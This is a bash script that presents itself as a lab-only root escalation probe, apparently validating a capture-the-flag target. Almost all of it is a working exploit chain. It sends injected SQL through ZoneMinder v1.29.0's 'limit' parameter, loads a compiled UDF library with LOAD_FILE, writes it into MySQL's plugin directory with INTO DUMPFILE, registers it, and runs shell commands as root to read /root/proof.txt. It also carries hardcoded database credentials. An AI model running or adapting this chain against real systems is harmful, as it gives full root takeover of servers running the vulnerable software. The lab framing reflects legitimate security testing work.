#!/usr/bin/env bash
# Full root escalation probe, executed only inside a short-lived isolated lab.
# The test helper .so was compiled in a SEPARATE, unshipped Xenial container.
set -Eeuo pipefail

plugin_dir=$(mysql --user=zmuser --password=zmpass -Nse 'SELECT @@plugin_dir')
[[ "$plugin_dir" = /* ]] || { echo 'FAIL: MySQL plugin directory is not absolute' >&2; exit 1; }
plugin_path="${plugin_dir%/}/ttp_udf_probe.so"
marker="/tmp/pebbles-udf-root-proof"
flagmarker="/tmp/pebbles-udf-root-flag"
test -s /tmp/ttp_udf_probe.so
# A low-privilege user must NOT be able to read the actual root proof directly.
! test -r /root/proof.txt || { echo "FAIL: direct root flag access unexpectedly permitted" >&2; exit 1; }
[[ ! -e "$plugin_path" ]] || { echo 'FAIL: test UDF already in plugin directory' >&2; exit 1; }
cleanup() {
    mysql --user=zmuser --password=zmpass -Nse 'DROP FUNCTION IF EXISTS ttp_exec' >/dev/null 2>&1 || true
    rm -f "$plugin_path" "$marker" "$flagmarker" /tmp/ttp_udf_probe.so || true
}
trap cleanup EXIT

inject() {
    local sql="$1"
    curl -sS --max-time 15 \
        --data-urlencode 'view=request' \
        --data-urlencode 'request=log' \
        --data-urlencode 'task=query' \
        --data-urlencode "limit=100;${sql}#" \
        'http://127.0.0.1:3305/zm/index.php' >/tmp/pebbles-udf-injection-response.txt || true
}

# All SQL actions below go through the same genuine ZoneMinder v1.29.0 SQLi.
inject 'CREATE TABLE zm.ttp_udf_probe(payload LONGBLOB)'
mysql --user=zmuser --password=zmpass -D zm -Nse "SHOW TABLES LIKE 'ttp_udf_probe'" | grep -Fxq ttp_udf_probe || { echo 'FAIL: injected CREATE TABLE' >&2; exit 1; }

inject "INSERT INTO zm.ttp_udf_probe VALUES(LOAD_FILE('/tmp/ttp_udf_probe.so'))"
length=$(mysql --user=zmuser --password=zmpass -D zm -Nse 'SELECT LENGTH(payload) FROM ttp_udf_probe')
[[ "$length" =~ ^[0-9]+$ && "$length" -gt 1000 ]] || { echo 'FAIL: SQLi did not load real UDF library bytes' >&2; exit 1; }

inject "SELECT payload FROM zm.ttp_udf_probe INTO DUMPFILE '$plugin_path'"
test -s "$plugin_path" || { echo 'FAIL: SQLi could not write to real MySQL plugin directory' >&2; exit 1; }

inject "CREATE FUNCTION ttp_exec RETURNS INTEGER SONAME 'ttp_udf_probe.so'"
mysql --user=zmuser --password=zmpass -Nse "SELECT COUNT(*) FROM mysql.func WHERE name='ttp_exec'" | grep -Fxq 1 || { echo 'FAIL: genuine MySQL UDF registration failed' >&2; exit 1; }

inject "SELECT ttp_exec('id -u > $marker')"
test -s "$marker" || { echo 'FAIL: actual UDF command did not run' >&2; exit 1; }
[[ "$(cat "$marker")" = 0 ]] || { echo 'FAIL: actual UDF command was not root' >&2; exit 1; }
[[ "$(stat -c '%u' "$marker")" = 0 ]] || { echo 'FAIL: root-owned UDF proof missing' >&2; exit 1; }
inject "SELECT ttp_exec('cat /root/proof.txt > $flagmarker')"
test -s "$flagmarker" || { echo 'FAIL: UDF could not read the root proof' >&2; exit 1; }
[[ "$(cat "$flagmarker")" = 'TTP{pebbles_unverified_demo_not_for_release}' ]] || { echo 'FAIL: UDF root proof content mismatch' >&2; exit 1; }
[[ "$(stat -c '%u' "$flagmarker")" = 0 ]] || { echo 'FAIL: UDF did not write the proof as OS root' >&2; exit 1; }
echo 'PASS: unprivileged www-data -> genuine ZoneMinder SQLi -> MySQL plugin -> real UID 0 -> /root/proof.txt'
